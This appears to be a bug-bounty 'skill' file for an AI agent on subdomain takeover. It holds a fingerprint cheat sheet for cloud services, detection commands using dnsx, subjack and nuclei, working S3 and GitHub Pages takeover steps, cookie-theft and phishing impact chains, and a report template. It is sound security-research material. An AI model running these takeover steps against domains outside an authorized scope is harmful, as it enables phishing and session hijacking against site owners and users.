---
name: subdomain-takeover
description: Detect and exploit subdomain takeover via dangling DNS records pointing to deprovisioned cloud services (S3, GitHub Pages, Heroku, Azure, Shopify, AWS CloudFront, etc.). Use after subdomain enumeration to identify takeover candidates.
metadata:
  type: skill
  phase: hunt
  vuln_class: subdomain-takeover
  tools: [subjack, nuclei, dnsx]
---

# Subdomain Takeover

> A free critical if found within minutes of the misconfig.

## When to invoke

**Trigger phrases:**
- "subdomain takeover"
- "dangling DNS"
- "can I take over X"
- "abandoned subdomain"

## Pre-flight: is it in scope?

Many programs **exclude** subdomain takeovers due to abuse. Always check.
- If excluded → still document but don't submit
- If allowed → high-value finding

## The vulnerability

CNAME points to a service that no longer hosts content for this domain:
```
abandoned.target.com  CNAME  target-old-bucket.s3.amazonaws.com
                                                ↑
                                The S3 bucket doesn't exist anymore.
                                Attacker creates a bucket with this name.
                                Now they control https://abandoned.target.com
```

## Vulnerable services (cheat sheet)

| Service | CNAME pattern | Fingerprint (error page) | Takeover steps |
|---|---|---|---|
| AWS S3 | `*.s3.amazonaws.com`, `*.s3-website-*.amazonaws.com` | `NoSuchBucket` | Create S3 bucket with same name |
| GitHub Pages | `*.github.io` | `There isn't a GitHub Pages site here.` | Create repo with that name, enable Pages |
| Heroku | `*.herokuapp.com` | `no-such-app` | Create Heroku app with that name |
| Azure | `*.azurewebsites.net`, `*.cloudapp.net` | `Error 404 - Web app not found` | Create Azure Web App |
| Bitbucket | `*.bitbucket.io` | `Repository not found` | Create matching repo |
| Shopify | `*.myshopify.com` | `Sorry, this shop is currently unavailable` | Register Shopify shop |
| Tumblr | `*.tumblr.com` | `There's nothing here` | Register Tumblr blog |
| WordPress | `*.wordpress.com` | `Do you want to register *.wordpress.com?` | Register on WP |
| Squarespace | `*.squarespace.com` | various | Register matching domain |
| Pantheon | `*.pantheonsite.io` | `The gods are wise...` | Add domain in Pantheon |
| Fastly | service CNAME | `Fastly error: unknown domain` | Sometimes claimable |
| Cloudfront | `*.cloudfront.net` | varies — needs investigation | More complex |
| Surge.sh | `*.surge.sh` | `project not found` | Deploy with surge CLI |
| Netlify | `*.netlify.com`, `*.netlify.app` | `Not Found - Request ID` | Add custom domain |
| Vercel | `*.vercel.app` | various | Add custom domain |
| Tilda | `*.tilda.ws` | `Please renew your subscription` | Register on Tilda |
| Webflow | webflow CNAME | `The page you are looking for doesn't exist` | Investigate |
| Helpjuice | `*.helpjuice.com` | `We could not find what you're looking for` | Register |
| Helpscout | `*.helpscoutdocs.com` | `No settings were found for this company` | Register |
| Freshdesk | `*.freshdesk.com` | check | Domain unclaimed |
| Zendesk | `*.zendesk.com` | `Help Center Closed` | Register subdomain |

Full list maintained at: https://github.com/EdOverflow/can-i-take-over-xyz

## Step-by-Step Workflow

### 1. Gather targets

Use existing subdomain enumeration:
```bash
ALL_SUBS="loot/target.com/subs/all.txt"

# Resolve all to get CNAMEs
cat "$ALL_SUBS" | dnsx -silent -cname -resp -json > resolved-cname.jsonl

# Filter only those with CNAMEs pointing outside the target's domain
cat resolved-cname.jsonl | jq -r 'select(.cname != null) | "\(.host) -> \(.cname[])"' > cname-map.txt
```

### 2. Run automated detection

```bash
# subjack
subjack -w "$ALL_SUBS" -t 100 -timeout 30 -o takeovers.txt -ssl -v -c ~/tools/subjack/fingerprints.json

# nuclei takeover templates (best maintained)
nuclei -list "$ALL_SUBS" -t http/takeovers/ -severity high,critical -silent -o nuclei-takeovers.txt

# Or with httpx + grep approach
cat "$ALL_SUBS" | httpx -silent -status-code -title -body -no-color | \
    grep -iE 'NoSuchBucket|no-such-app|repository not found|sorry, this shop is currently unavailable|do you want to register' \
    > grep-candidates.txt
```

### 3. Manual verification (CRITICAL — don't auto-submit)

For each candidate, **MANUALLY** verify:

```bash
SUB="abandoned.target.com"

# 1. Confirm CNAME
dig +short "$SUB"
# Expect: <something>.s3.amazonaws.com or similar

# 2. Confirm 404/error page
curl -s "https://$SUB" | head -50
# Look for service-specific error message

# 3. Verify takeover is actually possible
# E.g., for S3:
aws s3api head-bucket --bucket "<bucket-name-from-cname>"
# If "Not Found" → bucket doesn't exist → claimable
```

### 4. Attempt the takeover (in your own AWS/account)

For S3:
```bash
BUCKET="<bucket-name-from-cname>"
REGION="us-east-1"

aws s3api create-bucket --bucket "$BUCKET" --region "$REGION"
aws s3api put-bucket-website --bucket "$BUCKET" --website-configuration '{
  "IndexDocument": {"Suffix": "index.html"}
}'

# Upload proof file
echo "Subdomain takeover PoC - claude-cybersecurity-skills" > index.html
aws s3 cp index.html "s3://$BUCKET/index.html" --acl public-read

# Verify
curl https://"$SUB"
# Should show your content!
```

For GitHub Pages:
```
1. Create a public GitHub repo named exactly `<account>.github.io` or matching CNAME
2. Add an index.html with PoC content
3. Enable Pages from the repo settings, set custom domain to the vulnerable subdomain
4. Curl the subdomain — your content appears
```

### 5. Document with proof

Take a screenshot of the served content on the vulnerable subdomain.

## Impact framing (for the report)

Don't just say "I took it over." Frame:

```
1. SUBDOMAIN TAKEOVER  →  HOSTING ATTACKER CONTENT on app.target.com
2. + COOKIE SCOPE      →  Cookies set with domain=.target.com can be READ from subdomain
                          → Session hijack via JS on the taken-over subdomain
3. + OAUTH redirect_uri →  If OAuth allows any *.target.com → token theft
4. + CORS              →  If CORS reflects subdomains → cross-origin reads
5. + EMAIL spoofing    →  send emails "from" taken-over subdomain (looks legit)
6. + PHISHING          →  hosted phishing on real-looking domain
```

## Output template

```markdown
## High: Subdomain takeover of `abandoned.target.com` (CNAME → S3)

### Summary
`abandoned.target.com` has a dangling CNAME pointing to an unclaimed S3 bucket (`target-legacy-uploads.s3.amazonaws.com`). The bucket was claimed in our control AWS account, allowing arbitrary content serving on this target subdomain.

### Steps to reproduce
1. DNS lookup:
   ```
   dig +short abandoned.target.com
   target-legacy-uploads.s3.amazonaws.com.
   ```
2. The S3 bucket `target-legacy-uploads` returns `NoSuchBucket`:
   ```
   curl https://abandoned.target.com
   <Error><Code>NoSuchBucket</Code>...
   ```
3. We created `target-legacy-uploads` in our own AWS account (us-east-1), enabled static site hosting, uploaded a marker file.
4. Result — content served on the target subdomain:
   ```
   $ curl https://abandoned.target.com
   <html><body>PoC by [researcher] - reported as part of bug bounty</body></html>
   ```

### Impact
- Attacker content served on `abandoned.target.com`
- Cookies scoped to `.target.com` (the platform's session cookie `session_token` uses this domain) are sent to the taken-over subdomain by browsers → cookie/session theft via JS hosted on takeover
- Phishing: legitimate-looking subdomain enables high-trust phishing emails ("Login to your account at abandoned.target.com")
- Brand damage if attacker hosts inappropriate content

### Remediation steps
1. Immediately remove the CNAME record for `abandoned.target.com`
2. Or reclaim the S3 bucket via AWS support if needed
3. We have NOT uploaded any malicious content; only the marker file. Bucket was deleted after PoC verification.
4. Audit other CNAMEs in DNS for similar dangling references (see attached list — 4 other suspected candidates).

### Bucket cleanup
Bucket `target-legacy-uploads` will be deleted in 24 hours from this report timestamp unless you'd like to claim it.
```

## Cross-references

- `[[subdomain-enum]]` — feeds the candidate list
- `[[continuous-monitoring]]` — catch takeovers as they appear
- `[[ato-chains]]` — takeover + cookie scope = ATO
- `[[scope-analysis]]` — verify takeover is in scope before submitting

## Common pitfalls

1. **Submitting without manual verification.** False positives from automated tools = N/A.
2. **Submitting when program explicitly excludes takeovers.** Save your time.
3. **Not claiming the resource for proof.** Some triagers want to see "real takeover", not just the dangling CNAME.
4. **Causing harm.** Don't host malicious content. Just a marker page.
5. **Forgetting to release the bucket / repo after report acceptance.** Bucket squatting is unethical.

## Severity guide

| Context | Severity |
|---|---|
| Takeover of subdomain with cookie scope `.target.com` | Critical |
| Takeover of subdomain enabling OAuth callback abuse | Critical |
| Takeover of internal-looking subdomain (high phishing potential) | High |
| Takeover of marketing/blog subdomain (low session impact) | Medium |
| Takeover of staging/test subdomain | Medium |
| Takeover via "could potentially" — without actual takeover | N/A |

## Always-rejected variant

- Reporting the dangling CNAME without the actual takeover (some programs require proof of control)
- Takeover that doesn't actually serve attacker content (e.g., bucket exists but in another acct)
- Takeover of out-of-scope assets
- "I think this is takeoverable" without claiming

## Ethical reminder

- Take over only enough to prove the issue (single marker file)
- Don't host malicious content
- Don't keep the resource — release after triage confirms
- Document the cleanup steps in the report
- If the bug bounty program is paused or your access is revoked, release the resource immediately
